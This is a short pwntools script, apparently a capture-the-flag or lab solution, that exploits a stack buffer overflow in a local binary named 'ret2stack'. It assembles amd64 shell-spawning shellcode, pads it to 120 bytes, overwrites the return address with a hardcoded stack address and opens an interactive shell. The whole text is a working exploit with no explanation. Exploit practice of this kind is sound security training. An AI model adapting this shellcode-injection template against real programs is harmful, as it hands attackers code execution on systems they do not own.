from pwn import *;

context.arch = "amd64";

io = process("./ret2stack")

shellcode = asm(shellcraft.amd64.sh());
buf_addr = 0x7fffffffe0e0;
payload = shellcode.ljust(120, b'A') + p64(buf_addr);

io.send(payload);
io.interactive();
